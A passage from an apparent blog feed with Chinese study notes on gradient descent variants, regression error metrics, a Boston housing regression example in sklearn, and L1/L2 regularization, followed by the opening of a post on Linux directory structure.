alt="image-20230901183222050"></p><p><img src="/images/image-20230901183240178.png" alt="image-20230901183240178"></p><p><img src="/images/image-20230901183301618.png" alt="image-20230901183301618"></p><p><img src="/images/image-20230901183315009.png" alt="image-20230901183315009"></p><h4 id="梯度下降算法分类"><a href="#梯度下降算法分类" class="headerlink" title="梯度下降算法分类"></a>梯度下降算法分类</h4><ul><li><p>全梯度下降算法FGD</p><ul><li>每次迭代时，使用<strong>全部样本</strong>的梯度值<br><img src="/./assets/image-20250426183907177.png" alt="image-20250426183907177"></li><li>有m个样本，求梯度时用了所有m个样本</li><li>特点：慢</li></ul></li><li><p>随机梯度下降算法SGD</p><ul><li><p>每次迭代时, <strong>随机</strong>选择并使用<strong>一个样本</strong>梯度值<br><img src="/./assets/image-20250426183754464.png" alt="image-20250426183754464"></p></li><li><p>特点：简单，高效，不稳定，遇到噪声就ji</p></li></ul></li><li><p>小批量梯度下降算法 mini-bantch</p><ul><li>每次迭代时, <strong>随机选择</strong>并使用小批量的样本梯度值。从m个样本中，选择<strong>x个样本</strong>进行迭代(1&lt;x&lt;m)<br><img src="/./assets/image-20250426183607791.png" alt="image-20250426183607791"></li><li>若batch_size&#x3D;1，则变成了SGD；batch_size&#x3D;n，则变成了FGD</li><li>特点：目前使用<strong>最多</strong>，正是因为它避开了 FG 运算<strong>效率低成本大</strong>和 SG <strong>收敛效果不稳定</strong>的缺点</li></ul></li><li><p>随机梯度下降算法SAG</p><ul><li><p>每次迭代时, 随机选择一个样本的梯度值和<strong>以往样本的梯度值的均值</strong></p><p><img src="/./assets/image-20250426184535645-1745664336406-3.png" alt="image-20250426184535645"></p><ul><li>随机选择一个样本，假设选择 D 样本，计算其梯度值并存储到列表：[D]， 然后使用列表中的梯度值均值，更新模型参数。</li><li>随机再选择一个样本，假设选择 G 样本，计算其梯度值并存储到列表： [D, G]，然后使用列表中的梯度值均值，更新模型参数。</li><li>随机再选择一个样本，假设又选择了 D 样本, 重新计算该样本梯度值，并 更新列表中 D 样本的梯度值，使用列表中梯度值均值，更新模型参数。</li><li>…以此类推，直到算法收敛。</li></ul></li></ul></li><li><ul><li>训练初期<strong>表现不佳</strong>，优化<strong>速度较慢</strong>。这是因为我们<strong>常将初始梯度设为0</strong>， 而 SAG 每轮梯度更新都结合了上一轮梯度值。</li></ul></li></ul><h4 id="正规方程和梯度下降算法的对比"><a href="#正规方程和梯度下降算法的对比" class="headerlink" title="正规方程和梯度下降算法的对比"></a>正规方程和梯度下降算法的对比</h4><p><img src="/images/image-20230901162716376.png" alt="image-20230901162716376"></p><h1 id="回归评估方法"><a href="#回归评估方法" class="headerlink" title="回归评估方法"></a>回归评估方法</h1><p><strong>为什么要进行线性回归模型的评估</strong></p><p>我们希望衡量预测值和真实值之间的差距，</p><p>会用到<strong>MAE、MSE、RMSE多种测评函数</strong>进行评价</p><h3 id="平均绝对误差"><a href="#平均绝对误差" class="headerlink" title="平均绝对误差"></a>平均绝对误差</h3><p><strong>Mean Absolute Error (MAE)</strong></p><img src="images/mae.png" alt="img" style="zoom:33%;" /><ul><li>MAE <strong>越小</strong>模型<strong>预测越准确</strong></li></ul><p>Sklearn 中MAE的API</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.metrics <span class="keyword">import</span> mean_absolute_error</span><br><span class="line">mean_absolute_error(y_test,y_predict)</span><br></pre></td></tr></table></figure><h3 id="均方误差"><a href="#均方误差" class="headerlink" title="均方误差"></a>均方误差</h3><p>   <strong>Mean Squared Error (MSE)</strong></p><img src="images/mse.png" alt="img" style="zoom:33%;" /><ul><li>上面的公式中：n 为样本数量, y 为实际值, y拔为预测值</li><li>RMSE <strong>越小</strong>模型<strong>预测越准确</strong></li></ul><p>Sklearn 中MSE的API</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.metrics <span class="keyword">import</span> mean_squared_error</span><br><span class="line">mean_squared_error(y_test,y_predict)</span><br></pre></td></tr></table></figure><h3 id="均方根误差"><a href="#均方根误差" class="headerlink" title="均方根误差"></a>均方根误差</h3><p><strong>Root Mean Squared Error (RMSE)</strong></p><img src="images/rmse.png" alt="img" style="zoom: 33%;" /><ul><li>上面的公式中：n 为样本数量, y 为实际值, y拔为预测值</li><li>RMSE <strong>越小</strong>模型<strong>预测越准确</strong></li></ul><h3 id="三种指标的比较"><a href="#三种指标的比较" class="headerlink" title="三种指标的比较"></a>三种指标的比较</h3><p>我们绘制了一条直线 <strong>y &#x3D; 2x +5</strong> 用来拟合 <strong>y &#x3D; 2x + 5 + e.</strong> 这些数据点，其中e为噪声</p><img src="images/rmse2.png" alt="img" style="zoom:80%;" /><p>从上图中我们发现 <strong>MAE 和 RMSE 非常接近</strong>，都表明模型的误差很低**（MAE 或 RMSE 越小，误差越小！）**。 但是MAE 和 RMSE 有什么区别？为什么MAE较低？</p><ul><li>对比MAE 和 RMSE的公式，RMSE的计算公式中有一个平方项，<strong>因此：大的误差将被平方，因此会增加 RMSE 的值</strong></li><li>可以得出结论，<strong>RMSE 会放大</strong>预测<strong>误差</strong>较大的样本对结果的影响，而 <strong>MAE</strong> 只是给出了<strong>平均误差</strong></li><li>由于 RMSE 对误差的 <strong>平方和求平均</strong> 再开根号，大多数情况下<strong>RMSE&gt;MAE</strong></li></ul><h3 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h3><ul><li>都能反映出预测值和真实值之间的误差</li><li><strong>MAE（平均绝对误差）<strong>对误差大小</strong>不敏感</strong></li><li><strong>RMSE（均方根误差）<strong>会</strong>放大</strong>预测误差较大的样本的影响</li></ul><h2 id="波士顿房价预测案例"><a href="#波士顿房价预测案例" class="headerlink" title="波士顿房价预测案例"></a>波士顿房价预测案例</h2><h3 id="线性回归API"><a href="#线性回归API" class="headerlink" title="线性回归API"></a>线性回归API</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sklearn.linear_model.LinearRegression(fit_intercept=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><ul><li>通过正规方程优化</li><li>参数：<strong><code>fit_intercept</code></strong>，是否计算偏置</li><li>属性：<strong><code>LinearRegression.coef_</code> <strong>（回归系数）</strong><code>LinearRegression.intercept_</code></strong>（偏置）</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sklearn.linear_model.SGDRegressor(loss=<span class="string">&quot;squared_loss&quot;</span>, fit_intercept=<span class="literal">True</span>, learning_rate =<span class="string">&#x27;constant&#x27;</span>, eta0=<span class="number">0.01</span>)</span><br></pre></td></tr></table></figure><ul><li><strong><code>loss=&quot;squared_loss&quot;</code></strong><ul><li><strong>损失函数</strong>：均方误差（MSE），用于回归任务，计算预测值与真实值差的平方和，适合拟合连续型数据。</li></ul></li><li><strong><code>fit_intercept=True</code></strong><ul><li>是否计算截距<ul><li><code>True</code>：模型包含截距项（即偏置项 b）。</li><li><code>False</code>：模型无截距，强制拟合过原点的直线（(y &#x3D; wX)）。</li></ul></li></ul></li><li><strong><code>learning_rate=&#39;constant&#39;</code></strong><ul><li>学习率策略<ul><li><code>&#39;constant&#39;</code>：固定学习率，由 <code>eta0</code> 指定。</li><li>其他可选值：<ul><li><code>&#39;optimal&#39;</code>：随迭代自适应调整（需设置 <code>alpha</code>，适用于凸损失函数）。</li><li><code>&#39;invscaling&#39;</code>：按 <code>eta0 / sqrt(t)</code> 衰减（<code>t</code> 为迭代次数）。</li></ul></li></ul></li></ul></li><li><strong><code>eta0=0.01</code></strong><ul><li><strong>初始学习率</strong>：固定学习率的值为 <code>0.01</code>。</li></ul></li></ul><h3 id="波士顿房价预测"><a href="#波士顿房价预测" class="headerlink" title="波士顿房价预测"></a>波士顿房价预测</h3><h4 id="案例背景介绍"><a href="#案例背景介绍" class="headerlink" title="案例背景介绍"></a>案例背景介绍</h4><img src="images/006tNbRwly1ga8u37zooxj317g0tc7dk.jpg" style="zoom:50%;" /><h4 id="案例分析"><a href="#案例分析" class="headerlink" title="案例分析"></a>案例分析</h4><p>回归当中的<strong>数据大小不一致</strong>，是否会导致结果影响较大。所以需要做<strong>标准化处理</strong>。</p><ul><li>数据分割与标准化处理</li><li>回归预测</li><li>线性回归的算法效果评估</li></ul><h4 id="回归性能评估"><a href="#回归性能评估" class="headerlink" title="回归性能评估"></a>回归性能评估</h4><p>均方误差(Mean Squared Error, MSE)评价机制：</p><img src="images/image-20240731190903826.png" alt="image-20240731190903826" style="zoom: 67%;" /><p>sklearn中的API：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sklearn.metrics.mean_squared_error(y_true, y_pred)</span><br></pre></td></tr></table></figure><ul><li>均方误差回归损失</li><li>y_true:真实值</li><li>y_pred:预测值</li><li>return:浮点数结果</li></ul><h4 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h4><p><strong>正规方程法</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1. 导入依赖包</span></span><br><span class="line"><span class="keyword">from</span> sklearn.preprocessing <span class="keyword">import</span> StandardScaler</span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> train_test_split</span><br><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> LinearRegression</span><br><span class="line"><span class="keyword">from</span> sklearn.metrics <span class="keyword">import</span> mean_squared_error</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 数据预处理</span></span><br><span class="line"><span class="comment"># 获取数据</span></span><br><span class="line">data_url = <span class="string">&quot;http://lib.stat.cmu.edu/datasets/boston&quot;</span></span><br><span class="line">raw_df = pd.read_csv(data_url, sep=<span class="string">&quot;\s+&quot;</span>, skiprows=<span class="number">22</span>,  header=<span class="literal">None</span>)</span><br><span class="line">data = np.hstack([raw_df.values[::<span class="number">2</span>, :], raw_df.values[<span class="number">1</span>::<span class="number">2</span>, :<span class="number">2</span>]])</span><br><span class="line">target = raw_df.values[<span class="number">1</span>::<span class="number">2</span>, <span class="number">2</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 数据集划分</span></span><br><span class="line">x_train, x_test, y_train, y_test = train_test_split(data,  target, random_state=<span class="number">22</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 标准化</span></span><br><span class="line">transfer = StandardScaler()</span><br><span class="line">x_train = transfer.fit_transform(x_train)</span><br><span class="line">x_test = transfer.transform(x_test)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 模型训练，机器学习 - 线性回归</span></span><br><span class="line"><span class="comment"># 3.1 实例化模型(正规方程)</span></span><br><span class="line">estimator = LinearRegression()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3.2 模型训练</span></span><br><span class="line">estimator.fit(x_train, y_train)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 模型预测</span></span><br><span class="line">y_predict = estimator.predict(x_test)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;预测值为:&quot;</span>, y_predict)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;模型的权重系数为:&quot;</span>, estimator.coef_)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5. 模型评估，均方误差</span></span><br><span class="line">error = mean_squared_error(y_test, y_predict)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;误差为:&quot;</span>, error)</span><br><span class="line">   </span><br></pre></td></tr></table></figure><ul><li><code>data_url = &quot;http://lib.stat.cmu.edu/datasets/boston&quot;</code> 定义了数据的 URL 地址，数据是波士顿房价相关数据。</li><li><code>raw_df = pd.read_csv(data_url, sep=&quot;\s+&quot;, skiprows = 22, header=None)</code> 使用 <code>pandas</code> 的 <code>read_csv</code> 函数读取数据。<code>sep=&quot;\s+&quot;</code> 表示数据列之间的<strong>分隔符****是一个或多个空白字符</strong>；<code>skiprows = 22</code> 表示<strong>跳过前 22 行数据</strong>；<code>header=None</code> 表示数据文件没有表头。</li><li><code>data = np.hstack([raw_df.values[::2, :], raw_df.values[1::2, 2]])</code> 使用 <code>numpy</code> 的 <code>hstack</code> 函数将<strong>数据进行拼接</strong>。<code>raw_df.values[::2, :]</code> 取原始数据每隔一行的所有列，<code>raw_df.values[1::2, 2]</code> 取原始数据从第二行开始每隔一行的第三列（索引为 2），然后水平拼接。</li><li><code>target = raw_df.values[1::2, 2]</code> 单独提取出目标值，即从第二行开始每隔一行的第三列数据，作为要预测的目标。</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> train_test_split</span><br><span class="line"><span class="keyword">from</span> sklearn.preprocessing <span class="keyword">import</span> StandardScaler</span><br><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> SGDRegressor</span><br><span class="line"><span class="keyword">from</span> sklearn.metrics <span class="keyword">import</span> mean_squared_error</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.数据预处理</span></span><br><span class="line"><span class="comment"># 获取数据</span></span><br><span class="line">data_url = <span class="string">&quot;http://lib.stat.cmu.edu/datasets/boston&quot;</span></span><br><span class="line">raw_df = pd.read_csv(data_url, sep=<span class="string">&quot;\s+&quot;</span>, skiprows=<span class="number">22</span>,  header=<span class="literal">None</span>)</span><br><span class="line">data = np.hstack([raw_df.values[::<span class="number">2</span>, :], raw_df.values[<span class="number">1</span>::<span class="number">2</span>, :<span class="number">2</span>]])</span><br><span class="line">target = raw_df.values[<span class="number">1</span>::<span class="number">2</span>, <span class="number">2</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 数据集划分</span></span><br><span class="line">x_train, x_test, y_train, y_test = train_test_split(data,  target, random_state=<span class="number">22</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 标准化</span></span><br><span class="line">transfer = StandardScaler()</span><br><span class="line">x_train = transfer.fit_transform(x_train)</span><br><span class="line">x_test = transfer.transform(x_test)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3.模型训练</span></span><br><span class="line"><span class="comment"># 实例化模型--梯度下降法</span></span><br><span class="line">estimator = SGDRegressor()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 模型训练</span></span><br><span class="line">estimator.fit(x_train, y_train)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4.模型预测</span></span><br><span class="line">y_predict = estimator.predict(x_test)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;预测值为:&quot;</span>, y_predict)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;模型的权重系数为:&quot;</span>, estimator.coef_)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;模型的偏置为:&quot;</span>, estimator.intercept_)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5.模型评估, 均方误差</span></span><br><span class="line">error = mean_squared_error(y_test, y_predict)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;误差为:&quot;</span>, error)</span><br></pre></td></tr></table></figure><h2 id="正则化"><a href="#正则化" class="headerlink" title="正则化"></a>正则化</h2><h3 id="欠拟合与过拟合"><a href="#欠拟合与过拟合" class="headerlink" title="欠拟合与过拟合"></a>欠拟合与过拟合</h3><p>过拟合和欠拟合的区别：</p><img src="images/006tNbRwly1ga8u2rlw69j315m0oc40y.jpg" alt="æ¬ æåè¿æåå¾ç¤º" style="zoom: 33%;" /><ul><li><p>欠拟合在<strong>训练集和测试集</strong>上的<strong>误差都较大</strong></p></li><li><p>过拟合在<strong>训练集上误差较小</strong>，而<strong>测试集上误差较大</strong></p></li></ul><p><img src="/images/image-20230913101352444.png" alt="image-20230913101352444"></p><p><strong>欠拟合</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">np.random.seed(<span class="number">666</span>)</span><br><span class="line">x = np.random.uniform(-<span class="number">3</span>, <span class="number">3</span>, size=<span class="number">100</span>)</span><br><span class="line">y = <span class="number">0.5</span> * x ** <span class="number">2</span> + x + <span class="number">2</span> + np.random.normal(<span class="number">0</span>, <span class="number">1</span>, size=<span class="number">100</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 实例化线性回归模型</span></span><br><span class="line">estimator = LinearRegression()</span><br><span class="line"><span class="comment"># 模型训练</span></span><br><span class="line">X = x.reshape(-<span class="number">1</span>, <span class="number">1</span>) <span class="comment">#将数组 x 转换为列向量（二维数组）（-1换n）</span></span><br><span class="line">estimator.fit(X, y)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 模型预测</span></span><br><span class="line">y_predict = estimator.predict(X)</span><br></pre></td></tr></table></figure><p><img src="/images/1.png" alt="1"></p><p><strong>刚好拟合</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">estimator = LinearRegression()</span><br><span class="line">X = x.reshape(-<span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 为数据添加二次项特征，将原始特征 X 和其平方项按列拼接</span></span><br><span class="line">X2 = np.hstack([X, X ** <span class="number">2</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用添加二次项特征后的 X2 和目标值 y 训练线性回归模型</span></span><br><span class="line">estimator.fit(X2, y)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 模型预测</span></span><br><span class="line">y_predict = estimator.predict(X2)</span><br></pre></td></tr></table></figure><p><img src="/images/2.png" alt="2"></p><p><strong>过拟合</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">estimator = LinearRegression()</span><br><span class="line">X = x.reshape(-<span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 为数据添加高次项</span></span><br><span class="line">X2 = np.hstack([X, X ** <span class="number">2</span>, X ** <span class="number">3</span>, X ** <span class="number">4</span>, X ** <span class="number">5</span>, X ** <span class="number">6</span>, X ** <span class="number">7</span>, X ** <span class="number">8</span>, X ** <span class="number">9</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用添加高次项特征后的 X2 和目标值 y 训练线性回归模型</span></span><br><span class="line">estimator.fit(X2, y)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 模型预测</span></span><br><span class="line">y_predict = estimator.predict(X2)</span><br></pre></td></tr></table></figure><p><img src="/images/3.png"></p><h3 id="原因以及解决办法"><a href="#原因以及解决办法" class="headerlink" title="原因以及解决办法"></a>原因以及解决办法</h3><ul><li><p><strong>欠拟合产生原因：</strong> 学习到数据的<strong>特征过少</strong></p><ul><li>解决办法：<ul><li><strong>1）添加其他特征项</strong>：有时出现欠拟合是因为特征项不够导致的，可以添加其他特征项来解决</li><li><strong>添加多项式特征</strong>：模型过于简单时的常用套路，例如将线性模型通过<strong>添加二次项</strong>或<strong>三次项</strong>使模型泛化能力更强</li></ul></li></ul></li><li><p><strong>过拟合产生原因：</strong> 原始特征过多，存在一些嘈杂特征， 模型过于复杂是因为模型尝试去兼顾所有测试样本</p><ul><li><p>解决办法：</p><ul><li><strong>重新清洗数据</strong>：导致过拟合的一个原因有可能是数据不纯，如果出现了过拟合就需要重新清洗数据。</li></ul><ul><li><p><strong>增大数据的训练量</strong>：还有一个原因就是我们用于训练的数据量太小导致的，训练数据占总数据的比例过小。</p></li><li><p><strong>正则化</strong></p></li><li><p><strong>减少特征维度</strong></p></li></ul></li></ul></li></ul><h3 id="正则化-1"><a href="#正则化-1" class="headerlink" title="正则化"></a>正则化</h3><p>在学习的时候，数据提供的特征有些影响模型复杂度或者这个特征的数据点异常较多，所以算法在学习的时候尽量<strong>减少这个特征的影响（甚至删除某个特征的影响）</strong>，这就是<strong>正则化</strong></p><h4 id="L1正则化"><a href="#L1正则化" class="headerlink" title="L1正则化"></a><strong>L1正则化</strong></h4><ul><li><p>假设𝐿(𝑊)是未加正则项的损失，𝜆是一个超参，控制正则化项的大小。</p></li><li><p>则最终的损失函数：</p><img src="images/image-20240731190649914.png" alt="image-20240731190649914" style="zoom:50%;" /><ul><li>α 叫做<strong>惩罚系数</strong>，该值越大则权重调整的幅度越大，即：表示对特征权重惩罚力度就越大</li><li>L1 正则化会使得权重趋向于 0，<strong>甚至等于 0</strong>，使得<strong>某些特征失效</strong>，达到<strong>特征筛选</strong>的目的</li></ul></li></ul><p><strong>L1正则为什么可以产生稀疏解</strong></p><ul><li>L1正则化的梯度包含<strong>符号函数sign</strong>无论参数大小如何，<strong>惩罚力度恒定</strong>。当参数的原始<strong>梯度绝对值小于λ</strong>时，参数会被直接压缩至零</li></ul><img src="images/l2_4.png" alt="l2" style="zoom:50%;" /><p><strong>LASSO回归:</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> Lasso</span><br></pre></td></tr></table></figure><h4 id="L2正则化"><a href="#L2正则化" class="headerlink" title="L2正则化"></a><strong>L2正则化</strong></h4><ul><li><p>假设𝐿(𝑊)是未加正则项的损失，𝜆是一个超参，控制正则化项的大小。</p></li><li><p>则最终的损失函数：</p><p><img src="/./assets/image-20250426195500446.png" alt="image-20250426195500446"></p><ul><li>α 叫做惩罚系数，该值越大则权重调整的幅度就越大，即：表示对特征权重惩罚力度就越大 </li><li>L2 正则化会使得<strong>权重趋向于 0</strong>，<strong>一般不等于 0</strong></li></ul></li></ul><p>Ridge回归: </p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> Ridge</span><br></pre></td></tr></table></figure><h4 id="正则化案例"><a href="#正则化案例" class="headerlink" title="正则化案例"></a><strong>正则化案例</strong></h4><p>对过拟合模型L1正则化调整，会将高次方系数变为0</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> Lasso</span><br><span class="line"><span class="keyword">from</span> sklearn.metrics <span class="keyword">import</span> mean_squared_error</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 准备数据 x, y(增加上噪声)</span></span><br><span class="line">np.random.seed(<span class="number">666</span>)</span><br><span class="line">x = np.random.uniform(-<span class="number">3</span>, <span class="number">3</span>, size=<span class="number">100</span>)</span><br><span class="line">y = <span class="number">0.5</span> * x ** <span class="number">2</span> + x + <span class="number">2</span> + np.random.normal(<span class="number">0</span>, <span class="number">1</span>, size=<span class="number">100</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 训练模型</span></span><br><span class="line"><span class="comment"># 实例化 L1 正则化模型 做实验:alpha 惩罚力度越来越大,k 值越来越小,返回会欠拟合</span></span><br><span class="line">estimator = Lasso(alpha=<span class="number">0.005</span>, normalize=<span class="literal">True</span>)</span><br><span class="line"><span class="comment"># 模型训练</span></span><br><span class="line">X = x.reshape(-<span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line">X3 = np.hstack([X, X ** <span class="number">2</span>, X ** <span class="number">3</span>, X ** <span class="number">4</span>, X ** <span class="number">5</span>, X ** <span class="number">6</span>, X ** <span class="number">7</span>, X ** <span class="number">8</span>, X ** <span class="number">9</span>, X ** <span class="number">10</span>])  <span class="comment"># 数据增加二次项</span></span><br><span class="line">estimator.fit(X3, y)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;estimator.coef_&#x27;</span>, estimator.coef_)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 模型预测</span></span><br><span class="line">y_predict = estimator.predict(X3)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 模型评估，计算均方误差</span></span><br><span class="line"><span class="comment"># 模型评估 MSE</span></span><br><span class="line">myret = mean_squared_error(y, y_predict)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;myret--&gt;&#x27;</span>, myret)</span><br><span class="line"></span><br><span class="line">plt.scatter(x, y)</span><br></pre></td></tr></table></figure><p><img src="/images/l2_6.png" alt="img"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> Ridge</span><br><span class="line"><span class="keyword">from</span> sklearn.metrics <span class="keyword">import</span> mean_squared_error</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 准备数据 x, y(增加噪声)</span></span><br><span class="line">np.random.seed(<span class="number">666</span>)</span><br><span class="line">x = np.random.uniform(-<span class="number">3</span>, <span class="number">3</span>, size=<span class="number">100</span>)</span><br><span class="line">y = <span class="number">0.5</span> * x ** <span class="number">2</span> + x + <span class="number">2</span> + np.random.normal(<span class="number">0</span>, <span class="number">1</span>, size=<span class="number">100</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 训练模型</span></span><br><span class="line"><span class="comment"># 实例化 L2 正则化模型</span></span><br><span class="line">estimator = Ridge(alpha=<span class="number">0.005</span>, normalize=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 模型训练</span></span><br><span class="line">X = x.reshape(-<span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line">X3 = np.hstack([X, X ** <span class="number">2</span>, X ** <span class="number">3</span>, X ** <span class="number">4</span>, X ** <span class="number">5</span>, X ** <span class="number">6</span>, X ** <span class="number">7</span>, X ** <span class="number">8</span>, X ** <span class="number">9</span>, X ** <span class="number">10</span>])</span><br><span class="line">estimator.fit(X3, y)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;estimator.coef_&#x27;</span>, estimator.coef_)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 模型预测</span></span><br><span class="line">y_predict = estimator.predict(X3)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 模型评估，计算均方误差</span></span><br><span class="line">myret = mean_squared_error(y, y_predict)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;myret--&gt;&#x27;</span>, myret)</span><br><span class="line"></span><br><span class="line">plt.scatter(x, y)</span><br></pre></td></tr></table></figure><p><img src="/images/l2_7.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> 大模型 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>LINUX基础及DOCKER</title>
      <link href="/2025/04/27/linux%E5%9F%BA%E7%A1%80%E5%8F%8Adocker/"/>
      <url>/2025/04/27/linux%E5%9F%BA%E7%A1%80%E5%8F%8Adocker/</url>
      
        <content type="html"><![CDATA[<h1 id="LINUX基础及DOCKER"><a href="#LINUX基础及DOCKER" class="headerlink" title="LINUX基础及DOCKER"></a>LINUX基础及DOCKER</h1><h2 id="一、Linux基础"><a href="#一、Linux基础" class="headerlink" title="一、Linux基础"></a>一、Linux基础</h2><p>Linux是一个免费的、开源的类 UNIX 操作系统，在 1991 由林纳斯·托瓦兹在赫尔辛基大学上学时创立。Linux有上百种不同的发行版，如基于社区开发的debian、archlinux，和基于商业开发的Red Hat Enterprise Linux、SUSE、Oracle Linux等。目前市面上较知名的发行版有：Ubuntu、RedHat、CentOS、Debian、Fedora、SuSE、OpenSUSE、Arch Linux、SolusOS等。</p><h3 id="1-系统目录结构"><a href="#1-系统目录结构" class="headerlink" title="1. 系统目录结构"></a>1. 系统目录结构</h3><p>在 Linux 或 Unix 操作系统中，所有的文件和目录都被组织成以一个根节点开始的倒置的树状结构。文件系统的最顶层是由根目录开始的，系统使用<code>/</code>来表示根目录。在根目录之下的既可以是目录，也可以是文件，而每一个目录中又可以包含子目录文件。进入系统后在桌面点击鼠标右键，选择<code>Open Terminal</code>打开一个命令行窗口，这个命令行窗口也叫“终端”。在终端中输入<code>ls /</code>可以看到如下的文件及目录。</p><ul><li><code>/bin</code>：存放着最经常使用的命令。</li><li><code>/boot</code>：存放启动 Linux 时使用的一些核心文件，包括一些连接文件以及镜像文件。</li><li><code>/dev</code>：存放的是 Linux 的外部设备，在 Linux 中访问设备的方式和访问文件的方式是相同的。</li><li><code>/etc</code>：存放所有的系统管理所需要的配置文件和子目录。</li><li><code>/home</code>：用户的主目录，在 Linux 中，每个用户都有一个自己的目录，一般该目录名是以用户的账号命名的。</li><li><code>/lib</code>：存放着系统最基本的动态连接共享库，其作用类似于 Windows 里的 DLL 文件。几乎所有的应用程序都需要用到这些共享库。</li><li><code>/lost+found</code>：一般情况下是空的，当系统非法关机后，这里就存放了一些文件。</li><li><code>/media</code>：Linux 系统会自动识别一些设备，例如U盘、光驱等等，当识别后，Linux 会把识别的设备挂载到这个目录下。</li><li><code>/mnt</code>：系统提供该目录是为了让用户临时挂载别的文件系统的。</li><li><code>/opt</code>：给主机额外安装软件所摆放的目录。比如安装一个ORACLE数据库则可以放到这个目录下。默认是空的。</li><li><code>/proc</code>：存储的是当前内核运行状态的一系列特殊文件，这个目录是一个虚拟的目录，它是系统内存的映射，可以通过直接访问这个目录来获取系统信息。</li><li><code>/root</code>：系统管理员，也称作超级权限者的用户主目录。</li><li><code>/sbin</code>：存放的是系统管理员使用的系统管理程序。</li><li><code>/selinux</code>：Redhat&#x2F;CentOS 所特有的目录，Selinux 是一个安全机制，类似于 windows 的防火墙，这个目录存放selinux相关的文件。</li><li><code>/srv</code>：存放一些服务启动之后需要提取的数据。</li><li><code>/sys</code>：安装了 2.6 内核中新出现的一个文件系统 sysfs。该文件系统集成了针对进程信息的 proc 文件系统、针对设备的 devfs 文件系统以及针对伪终端的 devpts 